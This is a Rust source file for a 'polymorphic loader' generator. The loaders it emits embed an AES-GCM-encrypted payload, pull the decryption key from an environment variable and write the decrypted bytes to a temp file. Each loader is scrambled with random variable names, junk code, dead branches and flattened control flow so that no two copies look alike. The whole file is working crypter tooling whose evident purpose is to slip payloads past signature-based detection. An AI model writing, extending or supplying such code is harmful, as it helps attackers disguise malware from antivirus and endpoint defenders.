use rand::seq::SliceRandom;
use rand::Rng;
pub struct PolymorphicGenerator {
    rng: rand::rngs::StdRng,
}
impl PolymorphicGenerator {
    pub fn new() -> Self {
        use rand::SeedableRng;
        Self {
            rng: rand::rngs::StdRng::from_entropy(),
        }
    }
    fn gen_var_name(&mut self) -> String {
        let prefixes = ["var", "val", "tmp", "buf", "dat", "ptr", "ref", "obj"];
        let prefix = prefixes.choose(&mut self.rng).unwrap();
        format!("{}_{:08x}", prefix, self.rng.gen::< u32 > ())
    }
    fn gen_junk_code(&mut self) -> String {
        let junk_templates = vec![
            "let {var} = {val}u64.wrapping_mul({val2}u64);",
            "if {val} > {val2} {{ std::hint::black_box({val}); }}",
            "for _ in 0..{small} {{ std::hint::black_box({val}); }}",
            "let {var} = std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).unwrap().as_secs();",
        ];
        let template = junk_templates.choose(&mut self.rng).unwrap();
        template
            .replace("{var}", &self.gen_var_name())
            .replace("{val}", &self.rng.gen_range(1000..9999).to_string())
            .replace("{val2}", &self.rng.gen_range(100..999).to_string())
            .replace("{small}", &self.rng.gen_range(1..3).to_string())
    }
    fn flatten_control_flow(&mut self, original: &str) -> String {
        let var = self.gen_var_name();
        format!(
            r#"
            let mut {state_var} = {init_state};
            loop {{
                match {state_var} {{
                    0 => {{
                        {junk1}
                        {state_var} = 1;
                    }}
                    1 => {{
                        {original}
                        {state_var} = 2;
                    }}
                    2 => {{
                        {junk2}
                        break;
                    }}
                    _ => std::process::exit(1),
                }}
            }}
            "#,
            state_var = var, init_state = self.rng.gen_range(0..1), junk1 = self
            .gen_junk_code(), junk2 = self.gen_junk_code(), original = original
        )
    }
    pub fn generate_polymorphic_loader(
        &mut self,
        enc: &[u8],
        nonce: &[u8],
        salt: &[u8],
    ) -> String {
        let enc_var = self.gen_var_name();
        let nonce_var = self.gen_var_name();
        let salt_var = self.gen_var_name();
        let key_var = self.gen_var_name();
        let cipher_var = self.gen_var_name();
        let mut blocks = vec![
            self.gen_junk_code(),
            format!("let {} = env::var(\"PROTECT_KEY\").expect(\"missing key\");",
            key_var), self.gen_junk_code(),
        ];
        blocks.shuffle(&mut self.rng);
        let dead_branches: String = (0..self.rng.gen_range(2..5))
            .map(|_| {
                format!(
                    "if {} > {} {{ {} }}", self.rng.gen::< u32 > (), u32::MAX - 1, self
                    .gen_junk_code()
                )
            })
            .collect::<Vec<_>>()
            .join("\n");
        format!(
            r#"
            use aes_gcm::*;
            use sha2::*;
            use std::{{env, fs, process}};
            
            const {enc_var}: &[u8] = &{enc:?};
            const {nonce_var}: &[u8] = &{nonce:?};
            const {salt_var}: &[u8] = &{salt:?};
            
            fn main() {{
                {junk_start}
                {blocks}
                {dead_branches}
                
                {decrypt_logic}
                
                {junk_end}
            }}
            "#,
            enc_var = enc_var, nonce_var = nonce_var, salt_var = salt_var, enc = enc,
            nonce = nonce, salt = salt, junk_start = self.gen_junk_code(), blocks =
            blocks.join("\n"), dead_branches = dead_branches, decrypt_logic = self
            .flatten_control_flow(&
            format!(r#"
                let mut hasher = Sha256::new();
                hasher.update({}.as_bytes());
                hasher.update({});
                let derived = hasher.finalize();
                let {} = Aes256Gcm::new(Key::<Aes256Gcm>::from_slice(&derived));
                let dec = {}.decrypt(Nonce::from_slice({}), {}).expect("failed");
                let tmp = env::temp_dir().join("tmp_{:x}");
                fs::write(&tmp, &dec).expect("write failed");
                "#,
            key_var, salt_var, cipher_var, cipher_var, nonce_var, enc_var, self.rng
            .gen::< u32 > ())), junk_end = self.gen_junk_code(),
        )
    }
}